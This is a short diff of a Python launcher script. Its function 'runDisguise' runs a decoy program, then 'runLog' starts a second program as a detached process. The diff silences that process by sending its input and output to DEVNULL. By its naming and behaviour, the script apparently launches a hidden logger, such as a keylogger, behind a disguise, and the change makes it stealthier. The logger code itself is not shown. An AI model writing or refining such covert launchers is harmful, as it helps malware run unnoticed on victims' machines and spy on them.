@@ -13,7 +13,7 @@ else:
 
 def runDisguise():
     programPath = os.path.join(path, "test.py")
-    subprocess.run(["python", programPath], check=True)
+    subprocess.run(["python", programPath])
     runLog()
 
 def runLog():
@@ -21,11 +21,17 @@ def runLog():
     if platform.system() == "Windows":
         log_process = subprocess.Popen(
             ["python", programPath],
-            creationflags=subprocess.DETACHED_PROCESS)
+            creationflags=subprocess.DETACHED_PROCESS,
+            stdin=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL)
     else:
-        log_process = subprocess.Popen(["python", programPath])
+        log_process = subprocess.Popen(["python", programPath],
+                        stdin=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                        stdout=subprocess.DEVNULL)
 
     log_process.wait()
-
+    
 if __name__ == "__main__":
     runDisguise()
